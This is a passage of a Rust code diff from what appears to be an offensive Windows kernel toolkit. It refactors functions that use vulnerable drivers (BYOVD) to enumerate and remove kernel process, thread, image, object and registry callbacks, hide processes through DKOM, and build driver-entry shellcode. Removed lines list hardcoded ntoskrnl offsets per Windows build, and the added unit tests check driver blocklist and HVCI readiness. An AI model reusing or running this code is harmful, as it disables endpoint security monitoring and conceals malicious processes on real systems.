         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let ioctl_read_code = args
-        .get("ioctl_read_code")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing ioctl_read_code".to_string()))?
-        as u32;
+    let ioctl_read_code = require_u32_arg(args, "ioctl_read_code")?;
     let callback_type = args
         .get("callback_type")
         .and_then(|v| v.as_str())
@@ -815,7 +1344,13 @@ pub fn enum_kernel_callbacks(args: &Value) -> Result<Value, MemoricError> {
 
     // Known offsets for callback arrays vary by Windows version
     // User can provide the array address directly, or we use a built-in offset DB
-    let array_address = args.get("array_address").and_then(|v| v.as_u64());
+    let array_address = parse_optional_address_arg(args, "array_address");
+
+    let mut offset_profile = json!({
+        "source": "manual",
+        "callback_type": callback_type,
+        "confidence": "operator_supplied"
+    });
 
     let array_addr = if let Some(addr) = array_address {
         addr
@@ -824,70 +1359,27 @@ pub fn enum_kernel_callbacks(args: &Value) -> Result<Value, MemoricError> {
         // PspLoadImageNotifyRoutine, CmpCallbackListHead (registry callbacks)
         // These are offsets from ntoskrnl base; vary by build
         // Gathered from public PDB symbols / community research
-        let build = args
-            .get("build_number")
-            .and_then(|v| v.as_u64())
-            .unwrap_or_else(|| {
-                // Auto-detect Windows build number
-                let ver_info = unsafe { windows::Win32::System::SystemInformation::GetVersion() };
-                let build = (ver_info >> 16) & 0xFFFF;
-                build as u64
-            });
+        let build = parse_optional_u64_arg(args, "build_number").unwrap_or_else(|| {
+            // Auto-detect Windows build number
+            let ver_info = unsafe { windows::Win32::System::SystemInformation::GetVersion() };
+            let build = (ver_info >> 16) & 0xFFFF;
+            build as u64
+        });
 
-        #[rustfmt::skip]
-        let offset = match callback_type {
-            "process" => match build {
-                // PspCreateProcessNotifyRoutine offsets from ntoskrnl base
-                17763 => Some(0xC4D5C0u64), // Win10 1809
-                18362 => Some(0xC4E5C0),     // Win10 1903
-                18363 => Some(0xC4E5C0),     // Win10 1909
-                19041 => Some(0xCEC2C0),     // Win10 2004
-                19042 => Some(0xCEC2C0),     // Win10 20H2
-                19043 => Some(0xCEC2C0),     // Win10 21H1
-                19044 => Some(0xCEC2C0),     // Win10 21H2
-                19045 => Some(0xCEC2C0),     // Win10 22H2
-                22000 => Some(0xCEA2C0),     // Win11 21H2
-                22621 => Some(0xD892C0),     // Win11 22H2
-                22631 => Some(0xD892C0),     // Win11 23H2
-                26100 => Some(0xDBA2C0),     // Win11 24H2
-                _ => None,
-            },
-            "thread" => match build {
-                // PspCreateThreadNotifyRoutine
-                17763 => Some(0xC4D7C0u64),
-                18362 => Some(0xC4E7C0),
-                18363 => Some(0xC4E7C0),
-                19041 => Some(0xCEC4C0),
-                19042 => Some(0xCEC4C0),
-                19043 => Some(0xCEC4C0),
-                19044 => Some(0xCEC4C0),
-                19045 => Some(0xCEC4C0),
-                22000 => Some(0xCEA4C0),
-                22621 => Some(0xD894C0),
-                22631 => Some(0xD894C0),
-                26100 => Some(0xDBA4C0),
-                _ => None,
-            },
-            "image" => match build {
-                // PspLoadImageNotifyRoutine
-                17763 => Some(0xC4D9C0u64),
-                18362 => Some(0xC4E9C0),
-                18363 => Some(0xC4E9C0),
-                19041 => Some(0xCEC6C0),
-                19042 => Some(0xCEC6C0),
-                19043 => Some(0xCEC6C0),
-                19044 => Some(0xCEC6C0),
-                19045 => Some(0xCEC6C0),
-                22000 => Some(0xCEA6C0),
-                22621 => Some(0xD896C0),
-                22631 => Some(0xD896C0),
-                26100 => Some(0xDBA6C0),
-                _ => None,
-            },
-            _ => None,
+        let Some(kind) = CallbackOffsetKind::from_str(callback_type) else {
+            return Ok(serde_json::json!({
+                "success": false,
+                "technique": "enum_kernel_callbacks",
+                "callback_type": callback_type,
+                "kernel_base": format!("0x{:016X}", kernel_base),
+                "build_number": build,
+                "message": format!("Unknown callback type '{}'. Use process, thread, image, or provide array_address manually.", callback_type),
+            }));
         };
+        let resolved = resolve_callback_offset(build as u32, kind);
+        offset_profile = resolved.to_json();
 
-        match offset {
+        match resolved.offset {
             Some(off) => kernel_base + off,
             None => {
                 return Ok(serde_json::json!({
@@ -896,8 +1388,9 @@ pub fn enum_kernel_callbacks(args: &Value) -> Result<Value, MemoricError> {
                     "callback_type": callback_type,
                     "kernel_base": format!("0x{:016X}", kernel_base),
                     "build_number": build,
+                    "offset_profile": resolved.to_json(),
                     "message": format!("No offset for callback type '{}' on build {}. Provide array_address manually or use a supported build.", callback_type, build),
-                    "supported_builds": "17763(1809), 18362(1903), 18363(1909), 19041-19045(2004-22H2), 22000(21H2), 22621(22H2), 22631(23H2), 26100(24H2)"
+                    "supported_builds": crate::kernel_offsets::supported_builds_summary()
                 }));
             }
         }
@@ -999,6 +1492,7 @@ pub fn enum_kernel_callbacks(args: &Value) -> Result<Value, MemoricError> {
             "callback_type": callback_type,
             "kernel_base": format!("0x{:016X}", kernel_base),
             "array_address": format!("0x{:016X}", array_addr),
+            "offset_profile": offset_profile,
             "callbacks_found": callbacks.len(),
             "callbacks": callbacks,
             "message": format!("Found {} {} callbacks", callbacks.len(), callback_type)
@@ -1018,19 +1512,9 @@ pub fn remove_kernel_callback(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let ioctl_write_code = args
-        .get("ioctl_write_code")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing ioctl_write_code".to_string()))?
-        as u32;
-    let callback_index = args
-        .get("callback_index")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing callback_index".to_string()))?;
-    let array_address = args
-        .get("array_address")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing array_address".to_string()))?;
+    let ioctl_write_code = require_u32_arg(args, "ioctl_write_code")?;
+    let callback_index = require_u64_arg(args, "callback_index")?;
+    let array_address = require_address_arg(args, "array_address")?;
     let callback_type = args
         .get("callback_type")
         .and_then(|v| v.as_str())
@@ -1698,11 +2182,7 @@ pub fn dkom_hide_process(args: &Value) -> Result<Value, MemoricError> {
         .ok_or_else(|| {
             MemoricError::WindowsApi("Missing device_path (BYOVD driver)".to_string())
         })?;
-    let read_ioctl = args
-        .get("read_ioctl")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing read_ioctl".to_string()))?
-        as u32;
+    let read_ioctl = require_u32_arg(args, "read_ioctl")?;
     let write_ioctl = args
         .get("write_ioctl")
         .and_then(|v| v.as_u64())
@@ -2796,7 +3276,7 @@ pub fn object_callback_enum(args: &Value) -> Result<Value, MemoricError> {
     // Need the address of ObTypeIndexTable or the OBJECT_TYPE pointer
     // User can provide object_type_address directly, or we resolve via ntoskrnl export
     let object_type_addr =
-        if let Some(addr) = args.get("object_type_address").and_then(|v| v.as_u64()) {
+        if let Some(addr) = parse_optional_address_arg(args, "object_type_address") {
             addr
         } else {
             // Try resolving the exported symbol
@@ -2891,10 +3371,8 @@ pub fn object_callback_enum(args: &Value) -> Result<Value, MemoricError> {
         let obj_type_ptr = u64::from_le_bytes(obj_type_ptr_bytes);
 
         // OBJECT_TYPE.CallbackList is at offset 0xC8 on Win10/11
-        let callback_list_offset = args
-            .get("callback_list_offset")
-            .and_then(|v| v.as_u64())
-            .unwrap_or(0xC8);
+        let callback_list_offset =
+            parse_optional_u64_arg(args, "callback_list_offset").unwrap_or(0xC8);
         let callback_list_addr = obj_type_ptr + callback_list_offset;
 
         // Read LIST_ENTRY head (Flink)
@@ -3025,19 +3503,8 @@ pub fn object_callback_remove(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let write_ioctl = args
-        .get("write_ioctl")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing write_ioctl".to_string()))?
-        as u32;
-    let entry_address = args
-        .get("entry_address")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| {
-            MemoricError::WindowsApi(
-                "Missing entry_address (from object_callback_enum)".to_string(),
-            )
-        })?;
+    let write_ioctl = require_u32_arg(args, "write_ioctl")?;
+    let entry_address = require_address_arg(args, "entry_address")?;
 
     tracing::warn!(
         "[KERNEL] object_callback_remove: patching entry at 0x{:016X}",
@@ -3121,11 +3588,7 @@ pub fn registry_callback_enum(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let read_ioctl = args
-        .get("read_ioctl")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing read_ioctl".to_string()))?
-        as u32;
+    let read_ioctl = require_u32_arg(args, "read_ioctl")?;
 
     tracing::warn!("[KERNEL] registry_callback_enum via {}", device_path);
 
@@ -3133,43 +3596,33 @@ pub fn registry_callback_enum(args: &Value) -> Result<Value, MemoricError> {
 
     // Resolve CmpCallBackListHead from ntoskrnl exports
     // This is not an export, so user must provide the address, or we use build offset DB
-    let list_head_addr = if let Some(addr) = args.get("list_head_address").and_then(|v| v.as_u64())
-    {
+    let mut offset_profile = json!({
+        "source": "manual",
+        "kind": "registry",
+        "confidence": "operator_supplied"
+    });
+
+    let list_head_addr = if let Some(addr) = parse_optional_address_arg(args, "list_head_address") {
         addr
     } else {
-        let build = args
-            .get("build_number")
-            .and_then(|v| v.as_u64())
-            .unwrap_or_else(|| {
-                let ver = unsafe { windows::Win32::System::SystemInformation::GetVersion() };
-                ((ver >> 16) & 0xFFFF) as u64
-            });
+        let build = parse_optional_u64_arg(args, "build_number").unwrap_or_else(|| {
+            let ver = unsafe { windows::Win32::System::SystemInformation::GetVersion() };
+            ((ver >> 16) & 0xFFFF) as u64
+        });
 
-        // CmpCallBackListHead offsets from ntoskrnl base
-        #[rustfmt::skip]
-        let offset = match build {
-            17763 => Some(0xC6B700u64), // Win10 1809
-            18362 => Some(0xC6C700),     // Win10 1903
-            18363 => Some(0xC6C700),     // Win10 1909
-            19041 => Some(0xD0A400),     // Win10 2004
-            19042 => Some(0xD0A400),     // Win10 20H2
-            19043 => Some(0xD0A400),     // Win10 21H1
-            19044 => Some(0xD0A400),     // Win10 21H2
-            19045 => Some(0xD0A400),     // Win10 22H2
-            22000 => Some(0xD08400),     // Win11 21H2
-            22621 => Some(0xDA7400),     // Win11 22H2
-            22631 => Some(0xDA7400),     // Win11 23H2
-            26100 => Some(0xDD8400),     // Win11 24H2
-            _ => None,
-        };
+        let resolved = resolve_callback_offset(build as u32, CallbackOffsetKind::Registry);
+        offset_profile = resolved.to_json();
 
-        match offset {
+        match resolved.offset {
             Some(off) => kernel_base + off,
             None => {
                 return Ok(serde_json::json!({
                     "success": false,
                     "technique": "registry_callback_enum",
                     "kernel_base": format!("0x{:016X}", kernel_base),
+                    "build_number": build,
+                    "offset_profile": offset_profile,
+                    "supported_builds": crate::kernel_offsets::supported_builds_summary(),
                     "message": "CmpCallBackListHead offset unknown for this build. Provide list_head_address manually."
                 }))
             }
@@ -3298,6 +3751,7 @@ pub fn registry_callback_enum(args: &Value) -> Result<Value, MemoricError> {
             "success": true,
             "technique": "registry_callback_enum",
             "list_head_address": format!("0x{:016X}", list_head_addr),
+            "offset_profile": offset_profile,
             "callbacks_found": callbacks.len(),
             "callbacks": callbacks,
             "message": format!("Found {} CmRegisterCallback entries", callbacks.len())
@@ -3317,15 +3771,8 @@ pub fn registry_callback_remove(args: &Value) -> Result<Value, MemoricError> {
         .get("device_path")
         .and_then(|v| v.as_str())
         .ok_or_else(|| MemoricError::WindowsApi("Missing device_path".to_string()))?;
-    let write_ioctl = args
-        .get("write_ioctl")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing write_ioctl".to_string()))?
-        as u32;
-    let entry_address = args
-        .get("entry_address")
-        .and_then(|v| v.as_u64())
-        .ok_or_else(|| MemoricError::WindowsApi("Missing entry_address".to_string()))?;
+    let write_ioctl = require_u32_arg(args, "write_ioctl")?;
+    let entry_address = require_address_arg(args, "entry_address")?;
 
     tracing::warn!(
         "[KERNEL] registry_callback_remove: zeroing function at entry 0x{:016X}",
@@ -3934,4 +4381,170 @@ fn build_driver_entry_shellcode(entry_addr: u64) -> Vec<u8> {
     sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
     sc.push(0xC3); // ret
     sc
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn driver_blocklist_assessment_reports_policy_signals() {
+        let fp = &crate::byovd::BYOVD_DRIVERS[0];
+        let readiness = json!({
+            "readiness": {
+                "likely_blocked_by_hvci": true,
+                "likely_blocked_by_vulnerable_driver_blocklist": true
+            },
+            "signing": {
+                "test_signing_active": false
+            },
+            "wdac": {
+                "hvci_enabled": true,
+                "vulnerable_driver_blocklist_enabled": true,
+                "source": "test",
+                "note": "unit test"
+            }
+        });
+
+        let assessment = driver_blocklist_assessment(fp, &readiness);
+
+        assert_eq!(assessment["driver"], fp.name);
+        assert_eq!(assessment["likely_blocked"], true);
+        assert!(assessment["reasons"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|reason| reason["code"] == "hvci_enabled"));
+        assert!(assessment["reasons"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|reason| reason["code"] == "vulnerable_driver_blocklist_enabled"));
+        assert_eq!(assessment["signals"]["test_signing_active"], false);
+    }
+
+    #[test]
+    fn annotate_driver_candidate_adds_likely_blocked_and_evidence() {
+        let fp = &crate::byovd::BYOVD_DRIVERS[0];
+        let readiness = json!({
+            "readiness": {
+                "likely_blocked_by_hvci": false,
+                "likely_blocked_by_vulnerable_driver_blocklist": true
+            },
+            "signing": {
+                "test_signing_active": true
+            },
+            "wdac": {
+                "hvci_enabled": false,
+                "vulnerable_driver_blocklist_enabled": true,
+                "source": "test",
+                "note": "unit test"
+            }
+        });
+        let mut candidate = json!({
+            "name": fp.name,
+            "filename": fp.filenames[0],
+            "status": "on_disk"
+        });
+
+        annotate_driver_candidate(&mut candidate, fp, &readiness);
+
+        assert_eq!(candidate["likely_blocked"], true);
+        assert_eq!(candidate["blocklist_evidence"]["driver"], fp.name);
+        assert_eq!(
+            candidate["blocklist_evidence"]["signals"]["vulnerable_driver_blocklist_enabled"],
+            true
+        );
+    }
+
+    #[test]
+    fn byovd_preflight_identifies_known_device_and_ioctl_without_driver_ioctl() {
+        let fp = &crate::byovd::BYOVD_DRIVERS[0];
+        let result = byovd_preflight_json(&json!({
+            "device_path": fp.device_path,
+            "read_ioctl": fp.read_ioctl,
+            "write_ioctl": fp.write_ioctl,
+        }));
+
+        assert_eq!(result["kind"], "byovd_preflight");
+        assert_eq!(result["probe_only"], true);
+        assert_eq!(result["ioctl_executed"], false);
+        assert_eq!(result["matched_driver"]["name"], fp.name);
+        assert_eq!(result["contract"]["known_driver"], true);
+        assert_eq!(result["contract"]["read_ioctl_matches_database"], true);
+        assert_eq!(result["contract"]["write_ioctl_matches_database"], true);
+        assert_eq!(result["contract"]["confidence"], "known-matching");
+        assert_eq!(result["device_open"]["attempted"], false);
+    }
+
+    #[test]
+    fn byovd_preflight_accepts_custom_operator_supplied_ioctl_contract() {
+        let result = byovd_preflight_json(&json!({
+            "device_path": "\\\\.\\CustomVulnDrv",
+            "ioctl_code": 0x222004_u64,
+        }));
+
+        assert_eq!(result["matched_driver"], Value::Null);
+        assert_eq!(result["contract"]["known_driver"], false);
+        assert_eq!(result["contract"]["ioctl_contract_available"], true);
+        assert_eq!(
+            result["contract"]["confidence"],
+            "custom-device-operator-supplied-ioctl"
+        );
+        assert_eq!(result["device_open"]["attempted"], false);
+    }
+
+    #[test]
+    fn kernel_driver_lifecycle_json_tracks_first_failed_stage_and_cleanup() {
+        let mut lifecycle =
+            KernelDriverLifecycle::new("load", "demo_service", Some("C:\\temp\\demo.sys"));
+
+        lifecycle.record("open_scm", true, "opened");
+        lifecycle.record("start_service", false, "start failed");
+        lifecycle.record("open_device", false, "device missing");
+        lifecycle.record_cleanup("close_handles", true, "closed");
+
+        assert_eq!(lifecycle.failed_stage, Some("start_service"));
+
+        let json = lifecycle.to_json();
+        assert_eq!(json["operation"], "load");
+        assert_eq!(json["service_name"], "demo_service");
+        assert_eq!(json["driver_path"], "C:\\temp\\demo.sys");
+        assert_eq!(json["failed_stage"], "start_service");
+        assert_eq!(json["steps"].as_array().unwrap().len(), 3);
+        assert_eq!(json["cleanup"][0]["stage"], "close_handles");
+    }
+
+    #[test]
+    fn kernel_driver_lifecycle_failure_includes_stage_and_embedded_report() {
+        let mut lifecycle = KernelDriverLifecycle::new("unload", "demo_service", None);
+        lifecycle.record("open_existing_service", false, "access denied");
+        lifecycle.record_cleanup("close_scm", true, "closed=true");
+
+        let failure = driver_lifecycle_failure("unload_driver", &lifecycle, "cannot open service");
+
+        assert_eq!(failure["success"], false);
+        assert_eq!(failure["technique"], "unload_driver");
+        assert_eq!(failure["service_name"], "demo_service");
+        assert_eq!(failure["failed_stage"], "open_existing_service");
+        assert_eq!(
+            failure["lifecycle"]["failed_stage"],
+            "open_existing_service"
+        );
+        assert_eq!(failure["lifecycle"]["cleanup"][0]["stage"], "close_scm");
+        assert_eq!(failure["message"], "cannot open service");
+    }
+
+    #[test]
+    fn kernel_service_hresult_helper_matches_win32_values() {
+        assert_eq!(hresult_from_win32(0), 0);
+        assert_eq!(
+            hresult_from_win32(WIN32_ERROR_SERVICE_ALREADY_RUNNING),
+            0x8007_0420
+        );
+        assert_eq!(
+            hresult_from_win32(WIN32_ERROR_SERVICE_MARKED_FOR_DELETE),
+            0x8007_0430
+        );
+    }
 }
